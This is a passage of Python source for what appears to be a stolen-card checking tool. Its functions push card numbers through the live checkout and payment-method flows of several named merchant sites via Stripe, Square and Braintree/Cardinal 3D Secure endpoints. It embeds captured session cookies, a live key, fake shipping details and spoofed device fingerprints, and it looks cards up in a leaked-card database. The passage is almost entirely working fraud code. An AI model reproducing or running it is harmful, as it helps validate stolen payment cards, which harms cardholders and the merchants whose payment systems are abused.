    '_ga': 'GA1.1.685572626.1724182425',
    'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fladymcadden.org%2Fmy-account%2Fadd-payment-method%2F',
}
		
	headers = {
		    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-08-20%2019%3A33%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fladymcadden.org%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-08-20%2019%3A33%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fladymcadden.org%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F127.0.0.0%20Safari%2F537.36; cookielawinfo-checkbox-necessary=yes; _gid=GA1.2.2071831425.1724182427; __stripe_mid=9d51d6d0-d0f4-4403-87da-836ca70726e8bf10c8; __stripe_sid=66b6d69a-c648-40d7-a5ca-ebbbb3ffe32180ac9f; cookielawinfo-checkbox-non-necessary=no; CookieLawInfoConsent=eyJuZWNlc3NhcnkiOnRydWUsIm5vbi1uZWNlc3NhcnkiOmZhbHNlfQ==; viewed_cookie_policy=yes; wordpress_logged_in_4b482996f3b50f66c45a4b49c7a73faf=adfeaqfa%7C1725392052%7C1eu9g5oIGKYYR4loolt8VYQ4MEADKstFQ9JqD4JwgCZ%7C8e03ac40c9e90934798c274a369fcded5a9a619a4c8e07bbbd53f31772432441; wfwaf-authcookie-ef87ecef4dde9c78dcc1545fe505646f=145%7Cother%7Cread%7C427f7df542976bb5f3c714a627fc90ab2ca141f68dc06a4bf8fcd928916dcb04; _ga_TGRXJZZPXB=GS1.1.1724182424.1.1.1724182454.0.0.0; _ga_DJ8QP66SFT=GS1.1.1724182426.1.1.1724182454.0.0.0; _ga=GA1.1.685572626.1724182425; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fladymcadden.org%2Fmy-account%2Fadd-payment-method%2F',
    'origin': 'https://ladymcadden.org',
    'priority': 'u=1, i',
    'referer': 'https://ladymcadden.org/my-account/add-payment-method/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}
		
	response = requests.get('https://ladymcadden.org/my-account/add-payment-method/', cookies=cookies, headers=headers)
	nonce=re.findall(r'"add_card_nonce":"(.*?)"',response.text)[0]
	with open('gates.json', 'r') as file:
			json_data = json.load(file)
	nonce=json_data['sc']['nonce']=nonce
	with open('gates.json', 'w') as file:
			json.dump(json_data, file, indent=2)
	if 'success' in response.text:
		return 'Approved'
	try:		
		ct=(response.json()['client_secret'])
		cts=ct.split('_secret_')[0]
	except:
		print(response.json())
		return 'Your card was declined.'
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	data = {
	    'payment_method': id,
	    'expected_payment_method_type': 'card',
	    'use_stripe_sdk': 'true',
	    'key': 'pk_live_51IdYQ0LfHgkJerZf3qLsCoyaWQ4rQttxhjKCSgwBT2v5I8v9ro1YqMeypLPf6GgmCArfNox09l16a2HMKVNxk02z00QG312A1Y',
	    'client_secret': ct,
	}
	
	response = requests.post(
	    f'https://api.stripe.com/v1/setup_intents/{cts}/confirm',
	    headers=headers,
	    data=data,
	)
	sc=response.json()['next_action']['use_stripe_sdk']['three_d_secure_2_source']
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'source={sc}&browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22en-US%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22800%22%2C%22browserScreenWidth%22%3A%22360%22%2C%22browserTZ%22%3A%22-120%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Linux%3B+Android+10%3B+K)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F120.0.0.0+Mobile+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=false&one_click_authn_device_support[webauthn_eligible]=false&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key=pk_live_51IdYQ0LfHgkJerZf3qLsCoyaWQ4rQttxhjKCSgwBT2v5I8v9ro1YqMeypLPf6GgmCArfNox09l16a2HMKVNxk02z00QG312A1Y'
	
	response = requests.post('https://api.stripe.com/v1/3ds2/authenticate', headers=headers, data=data)
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	params = {
	    'key': 'pk_live_51IdYQ0LfHgkJerZf3qLsCoyaWQ4rQttxhjKCSgwBT2v5I8v9ro1YqMeypLPf6GgmCArfNox09l16a2HMKVNxk02z00QG312A1Y',
	    'is_stripe_sdk': 'false',
	    'client_secret': ct,
	}
	
	response = requests.get(f'https://api.stripe.com/v1/setup_intents/{cts}', params=params, headers=headers)
	try:
		return (response.json()['last_setup_error']['message'])
	except:
		return '3d_secure_2'
def sh(card):
	card = card.strip()
	parts = re.split('[|]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]
	if len(yy) == 2:
		yy=f'20{yy}'
	
	cookies = {
    '_savt': 'b4b8f06a-a1db-4154-810c-0981720b82aa',
    '__cf_bm': 'sf8ESwsAxao6259N__r_pPMAJ2Y1ipFIyhLL0FncsBk-1724181746-1.0.1.1-n6k83GbwH0zAGyhz0FBIINU3957KYU5a9yh0BnYGsTupYG32fVYbOCUsd8I1YVLeuGkcczJ_jHjWNr51UmvJkw',
}

	
	headers = {
	    'accept': 'application/json',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/json; charset=utf-8',
    # 'cookie': '_savt=b4b8f06a-a1db-4154-810c-0981720b82aa; __cf_bm=sf8ESwsAxao6259N__r_pPMAJ2Y1ipFIyhLL0FncsBk-1724181746-1.0.1.1-n6k83GbwH0zAGyhz0FBIINU3957KYU5a9yh0BnYGsTupYG32fVYbOCUsd8I1YVLeuGkcczJ_jHjWNr51UmvJkw',
    'origin': 'https://web.squarecdn.com',
    'priority': 'u=1, i',
    'referer': 'https://web.squarecdn.com/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}
	
	params = {
    '_': '1724181827539.0325',
    'version': '1.60.5',
}
	
	json_data = {
	    'client_id': 'sq0idp-9ShLQffc_52GQ-PV3xba1Q',
    'instance_id': 'f596da61-59be-43b9-ba6b-2134f325a639',
    'location_id': 'AM31SXMGB2JP6',
    'payment_method_tracking_id': '5b95e4e6-22c7-2b5f-b8c6-3a3582d16679',
    'session_id': 'OrO-hijlNt9A0mTVdITEQTUkQDuNai9y-5a-TeiYGil_KkQI3R4k-UgnLyC4b01_UZ6_kOZiDQmb0Eedp34i9Ig6acltgdKK79wkg4n0AggT5hNHtR4OqQ==',
    'website_url': 'codeofharmony.com',
    'analytics_token': 'PZCNSOFE3DWTICBLAIYUMMDYL2HGRVJP423EHTVYA2DWHS4QVWZXFWBI7FMTYXBAIVU3RVAMOWYQEX3JHF42XC4KZS7NQ3HRFRKA',
    'pow_counter': 17595,
    'card_data': {
        'billing_postal_code': '10080',
        'cvv': cvc,
        'exp_month': int(mm),
        'exp_year': int(yy),
        'number': n,
    },
}
	
	response = requests.post(
	    'https://pci-connect.squareup.com/v2/card-nonce',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    json=json_data,
	)

	id=response.json()['card_nonce']
	headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://codeofharmony.com',
    'priority': 'u=1, i',
    'referer': 'https://codeofharmony.com/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}
	
	data = {
    'discount_code': '',
    'giftcard_code': '',
    'checkout_email': 'adfeaqfa@gmail.com',
    'phone': '09195157628',
    'shipping[first_name]': 'Christa',
    'shipping[last_name]': 'afadf',
    'shipping[address]': '1981 Jennifer Lane',
    'shipping[address2]': '',
    'shipping[city]': 'Raleigh',
    'shipping[country]': 'US',
    'shipping[state]': 'NY',
    'shipping[pincode]': '10080',
    'shipping_charge': '8.0',
    'billingadd': 'ship',
    'billing[first_name]': 'Christa',
    'billing[last_name]': 'afadf',
    'billing[address]': '1981 Jennifer Lane',
    'billing[address2]': '',
    'billing[city]': 'Raleigh',
    'billing[country]': 'US',
    'billing[state]': 'NY',
    'billing[pincode]': '10080',
    'customer_id': '',
    'note': '',
    'cust_ws_tag': '',
    'shop': '2f8ca4.myshopify.com',
    'cart': 'eyJ0b2tlbiI6IloyTndMV1YxY205d1pTMTNaWE4wTVRvd01VbzFVa3RVTTBGSFNsSlhSekpVUWxSWVMwZE5RakpIVVE/a2V5PWQyYWU2M2ZkZThkODAxZTlmMzQ0NTdhOTQ2ZTI1NTlmIiwibm90ZSI6IiIsImF0dHJpYnV0ZXMiOltdLCJvcmlnaW5hbF90b3RhbF9wcmljZSI6MTYwMCwidG90YWxfcHJpY2UiOjE2MDAsInRvdGFsX2Rpc2NvdW50IjowLCJ0b3RhbF93ZWlnaHQiOjAsIml0ZW1fY291bnQiOjEsIml0ZW1zIjpbeyJpZCI6NDU4OTIyNzE5MzE2OTgsInByb3BlcnRpZXMiOltdLCJxdWFudGl0eSI6MSwidmFyaWFudF9pZCI6NDU4OTIyNzE5MzE2OTgsImtleSI6IjQ1ODkyMjcxOTMxNjk4OmMwOTk3NmJkNWQxYjZlOTA3NWRlNDg0YjExMzFkYjQ3IiwidGl0bGUiOiJDb2xsYWdlbiBNYXNxdWUgLSBNaW5pIDAuNW96IC0gJDE2LjAwIiwicHJpY2UiOjE2MDAsIm9yaWdpbmFsX3ByaWNlIjoxNjAwLCJwcmVzZW50bWVudF9wcmljZSI6MTYsImRpc2NvdW50ZWRfcHJpY2UiOjE2MDAsImxpbmVfcHJpY2UiOjE2MDAsIm9yaWdpbmFsX2xpbmVfcHJpY2UiOjE2MDAsInRvdGFsX2Rpc2NvdW50IjowLCJkaXNjb3VudHMiOltdLCJza3UiOiIiLCJncmFtcyI6MCwidmVuZG9yIjoiQ09IIFNob3AiLCJ0YXhhYmxlIjp0cnVlLCJwcm9kdWN0X2lkIjo4NTE4MTA0MDg4ODgyLCJwcm9kdWN0X2hhc19vbmx5X2RlZmF1bHRfdmFyaWFudCI6ZmFsc2UsImdpZnRfY2FyZCI6ZmFsc2UsImZpbmFsX3ByaWNlIjoxNjAwLCJmaW5hbF9saW5lX3ByaWNlIjoxNjAwLCJ1cmwiOiJcL3Byb2R1Y3RzXC9jb2xsYWdlbi1tYXNxdWUtaHlkcmF0aW5nLWZhY2UtY3JlYW0/dmFyaWFudD00NTg5MjI3MTkzMTY5OCIsImZlYXR1cmVkX2ltYWdlIjp7ImFzcGVjdF9yYXRpbyI6MSwiYWx0IjoiQ29sbGFnZW4gTWFzcXVlIiwiaGVpZ2h0IjoxOTAwLCJ1cmwiOiJodHRwczpcL1wvY2RuLnNob3BpZnkuY29tXC9zXC9maWxlc1wvMVwvMDc5OVwvMTc1NFwvNzgyNlwvZmlsZXNcL0NvbGxhZ2VuTWFzcXVlQmlvbWltZXRyaWNfUHJvZHVjdFBpY3R1cmVfV2hpdGVCYWNrZ3JvdW5kLmpwZz92PTE2OTAyMjQ3NDIiLCJ3aWR0aCI6MTkwMH0sImltYWdlIjoiaHR0cHM6XC9cL2Nkbi5zaG9waWZ5LmNvbVwvc1wvZmlsZXNcLzFcLzA3OTlcLzE3NTRcLzc4MjZcL2ZpbGVzXC9Db2xsYWdlbk1hc3F1ZUJpb21pbWV0cmljX1Byb2R1Y3RQaWN0dXJlX1doaXRlQmFja2dyb3VuZC5qcGc/dj0xNjkwMjI0NzQyIiwiaGFuZGxlIjoiY29sbGFnZW4tbWFzcXVlLWh5ZHJhdGluZy1mYWNlLWNyZWFtIiwicmVxdWlyZXNfc2hpcHBpbmciOnRydWUsInByb2R1Y3RfdHlwZSI6IiIsInByb2R1Y3RfdGl0bGUiOiJDb2xsYWdlbiBNYXNxdWUiLCJwcm9kdWN0X2Rlc2NyaXB0aW9uIjoiVmlzaWJseSBwbHVtcCwgaHlkcmF0ZSwgYW5kIGNhbG0geW91ciBza2luIHdpdGggdGhpcyBsdXh1cmlvdXMgZ2VsIG1hc3F1ZS5cbk5ldyBJbXByb3ZlZCBGb3JtdWxhISBUaGlzIGplbGx5LXRleHR1cmVkIG1hc3F1ZSBpcyBwZXJmZWN0IGZvciBldmVyeW9uZSBpbiBuZWVkIG9mIGEgbWVnYSBkb3NlIG9mIHNvb3RoaW5nIGh5ZHJhdGlvbi4gRGVoeWRyYXRlZCBza2luXHUwMGEwdHlwZXMgd2lsbCBsb3ZlIHRoZVx1MDBhMHNvZnQsXHUwMGEwc21vb3RoIHNraW4gdGV4dHVyZSBhbmQgdmlzaWJsZSByZWR1Y3Rpb24gaW4gZmluZSBsaW5lcyBhbmQgd3JpbmtsZXMuIFRoaXMgbWFzcXVlIGlzIGJvdGggY2FsbWluZyBhbmQgc3RpbXVsYXRpbmcsIGxlYXZpbmcgc2tpbiBkZXd5LCByZWZyZXNoZWQsIGFuZCBoeWRyYXRlZC4gRm9yIGFsbCBza2luIHR5cGVzLlxuV2hhdCBpdCBkb2VzXG5cblZpc2libHkgcGx1bXBzIGZpbmUgbGluZXMgYW5kIHdyaW5rbGVzXG5EZWVwbHkgaHlkcmF0ZXMgYW5kIHNvZnRlbnMgc2tpblxuQ2FsbXMsIHJlZHVjZXMgcmVkbmVzcyBkdWUgdG8gZHJ5bmVzc1xuU2tpbiBhcHBlYXJzIGZpcm1lclwvbGlmdGVkXG5cbktleSBJbmdyZWRpZW50cyB0aGF0IHdvcmsgd2l0aCB5b3VyIHNraW5cbkJpb21pbWV0aWMgQ29sbGFnZW4gYW5kIEVsYXN0aW4sIEh5YWx1cm9uaWMgQWNpZCwgVHJlbWVsbGEgTXVzaHJvb20sIENCRCArIENCRyIsInZhcmlhbnRfdGl0bGUiOiJNaW5pIDAuNW96IC0gJDE2LjAwIiwidmFyaWFudF9vcHRpb25zIjpbIk1pbmkgMC41b3ogLSAkMTYuMDAiXSwib3B0aW9uc193aXRoX3ZhbHVlcyI6W3sibmFtZSI6IlNpemUiLCJ2YWx1ZSI6Ik1pbmkgMC41b3ogLSAkMTYuMDAifV0sImxpbmVfbGV2ZWxfZGlzY291bnRfYWxsb2NhdGlvbnMiOltdLCJsaW5lX2xldmVsX3RvdGFsX2Rpc2NvdW50IjowLCJoYXNfY29tcG9uZW50cyI6ZmFsc2UsInNxdWFyZV9kaXNjb3VudCI6W10sInN1YnNjcmlwdGlvbl9kaXNjb3VudCI6W119XSwicmVxdWlyZXNfc2hpcHBpbmciOnRydWUsImN1cnJlbmN5IjoiVVNEIiwiaXRlbXNfc3VidG90YWxfcHJpY2UiOjE2MDAsImNhcnRfbGV2ZWxfZGlzY291bnRfYXBwbGljYXRpb25zIjpbXX0=',
    'shipping_lines': '{"id":"shopify-Economy-8.00","title":"Economy","price":"8.00","code":"Economy","source":"shopify"}',
    'sms_multi_shipping_lines': '',
    'sms_multi_tax_lines': '',
    'tax_lines': '[{"title":"New York State Tax","price":0,"rate":0}]',
    'processCheckout': '1',
    'ac_token': '',
    'shop_currency_name': 'USD',
    'shop_currency_symbol': '$',
    'checkout_id': 'Z2lkOi8vc2hvcGlmeS9DaGVja291dC81MWQ5YmFiZWI5MjBmMmQ4Y2U4ZTkyMmE1MDk2ZWZlNz9rZXk9ZGY5MDJhYjM3ZDNiZTgzY2M0Y2QxZjViZmM1YTBhMjQ=',
    'nonce': id,
}
	
	response = requests.post('https://phpstack-1046663-3864545.cloudwaysapps.com//controller.php', headers=headers, data=data)
	try:
		res=(response.json()['message'].split(':')[1].split('<')[0].replace("'",""))
	except:
		res=(response.json()['message'])
	return res
def pv(ccx):
	import requests
	ccx=ccx.split('|')[0]
	cards = [f"{ccx}"]
	response = requests.post(
	    "https://api.antipublic.cc/cards",
	    json=cards
	).json()
	try:
		i=(response['private'][0])
		return 'private'
	except:
		i=(response['public'][0])
		return 'public'		
def vbv(ccx):
	import requests,re,base64,jwt,json
	cc=ccx
	def get_ref():
		with open('gates.json', 'r') as file:
			json_dataa = json.load(file)
		cookies = {
		    'PHPSESSID': 'f4fc65f622f00d6f3203066dc890bd89'
		}
		headers = {
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
		}
		response = requests.get('https://www.sportfish.co.uk/checkout/', cookies=cookies, headers=headers)
		no=re.findall(r'"clientToken":"(.*?)"',response.text)[0]
		encoded_text = no
		decoded_text = base64.b64decode(encoded_text).decode('utf-8')
		au=re.findall(r'"authorizationFingerprint":"(.*?)"',decoded_text)[0]
		headers = {
		    'authority': 'payments.braintree-api.com',
		    'accept': '*/*',
		    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
		    'authorization': f'Bearer {au}',
		    'braintree-version': '2018-05-10',
		    'content-type': 'application/json',
		    'origin': 'https://www.sportfish.co.uk',
		    'referer': 'https://www.sportfish.co.uk/',
		    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'cross-site',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
		}
		json_data = {
		    'clientSdkMetadata': {
		        'source': 'client',
		        'integration': 'custom',
		        'sessionId': 'e4ea0503-2df6-459c-b10c-f2c18dd8bccd',
		    },
		    'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment     }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
		    'operationName': 'ClientConfiguration',
		}
		response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
		cardnal=response.json()['data']['clientConfiguration']['creditCard']['threeDSecure']['cardinalAuthenticationJWT']
		headers = {
		    'authority': 'centinelapi.cardinalcommerce.com',
		    'accept': '*/*',
		    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
		    'content-type': 'application/json;charset=UTF-8',
		    'origin': 'https://www.sportfish.co.uk',
		    'referer': 'https://www.sportfish.co.uk/',
		    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'cross-site',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
		    'x-cardinal-tid': 'Tid-254fb674-0925-4e3e-9afa-fa4d4326757d',
		}
		json_data = {
		    'BrowserPayload': {
		        'Order': {
		            'OrderDetails': {},
		            'Consumer': {
		                'BillingAddress': {},
		                'ShippingAddress': {},
		                'Account': {},
		            },
		            'Cart': [],
		            'Token': {},
		            'Authorization': {},
		            'Options': {},
		            'CCAExtension': {},
		        },
		        'SupportsAlternativePayments': {
		            'cca': True,
		            'hostedFields': False,
		            'applepay': False,
		            'discoverwallet': False,
		            'wallet': False,
		            'paypal': False,
		            'visacheckout': False,
		        },
		    },
		    'Client': {
		        'Agent': 'SongbirdJS',
		        'Version': '1.35.0',
		    },
		    'ConsumerSessionId': None,
		    'ServerJWT': cardnal,
		}
		response = requests.post('https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init', headers=headers, json=json_data)
		payload = response.json()['CardinalJWT']
		payload_dict = jwt.decode(payload, options={"verify_signature": False})
		ref = payload_dict['ReferenceId']
		json_dataa['up']['re']=ref
		json_dataa['up']['au']=au
		with open('gates.json', 'w') as json_file:
			json.dump(json_dataa, json_file, ensure_ascii=False, indent=4)
		headers = {
		    'authority': 'geo.cardinalcommerce.com',
		    'accept': '*/*',
		    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
		    'content-type': 'application/json',
		    'origin': 'https://geo.cardinalcommerce.com',
		    'referer': f'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true&alias=Default&orgUnitId=5f45accd4c6a414cafc1ae4e&tmEventType=PAYMENT&referenceId={ref}&geolocation=false&origin=Songbird',
		    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-origin',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
		    'x-requested-with': 'XMLHttpRequest',
		}
		json_data = {
		    'Cookies': {
		        'Legacy': True,
		        'LocalStorage': True,
		        'SessionStorage': True,
		    },
		    'DeviceChannel': 'Browser',
		    'Extended': {
		        'Browser': {
		            'Adblock': True,
		            'AvailableJsFonts': [],
		            'DoNotTrack': 'unknown',
		            'JavaEnabled': False,
		        },
		        'Device': {
		            'ColorDepth': 24,
		            'Cpu': 'unknown',
		            'Platform': 'Linux armv81',
		            'TouchSupport': {
		                'MaxTouchPoints': 5,
		                'OnTouchStartAvailable': True,
		                'TouchEventCreationSuccessful': True,
		            },
		        },
		    },
		    'Fingerprint': '4291e9424912bfb097796e676a43a259',
		    'FingerprintingTime': 1249,
		    'FingerprintDetails': {
		        'Version': '1.5.1',
		    },
		    'Language': 'en-US',
		    'Latitude': None,
		    'Longitude': None,
		    'OrgUnitId': '5f45accd4c6a414cafc1ae4e',
		    'Origin': 'Songbird',
		    'Plugins': [],
		    'ReferenceId': ref,
		    'Referrer': 'https://www.sportfish.co.uk/',
		    'Screen': {
		        'FakedResolution': False,
		        'Ratio': 2.2213740458015265,
		        'Resolution': '873x393',
		        'UsableResolution': '873x393',
		        'CCAScreenSize': '02',
		    },
		    'CallSignEnabled': None,
		    'ThreatMetrixEnabled': False,
		    'ThreatMetrixEventType': 'PAYMENT',
		    'ThreatMetrixAlias': 'Default',
		    'TimeOffset': -120,
		    'UserAgent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
		    'UserAgentDetails': {
		        'FakedOS': False,
		        'FakedBrowser': False,
		    },
		    'BinSessionId': 'add5c63e-e8fb-4e9c-a235-b13f64a74f69',
		}
		response = requests.post(
		    'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData',
		    headers=headers,
		    json=json_data,
		)
		hi=result(cc)
		return hi
	def result(cc):
		n=cc.split('|')[0]
		with open('gates.json', 'r') as file:
			json_data = json.load(file)
		au=(json_data['up']['au'])
		ref=(json_data['up']['re'])
		headers = {
		    'authority': 'payments.braintree-api.com',
		    'accept': '*/*',
		    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
		    'authorization': f'Bearer {au}',
		    'braintree-version': '2018-05-10',
		    'content-type': 'application/json',
		    'origin': 'https://assets.braintreegateway.com',
		    'referer': 'https://assets.braintreegateway.com/',
		    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'cross-site',
		    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}
		json_data = {
		    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '4dca19f1-754d-4e79-a20f-b0dd2d6dbf58',
		    },
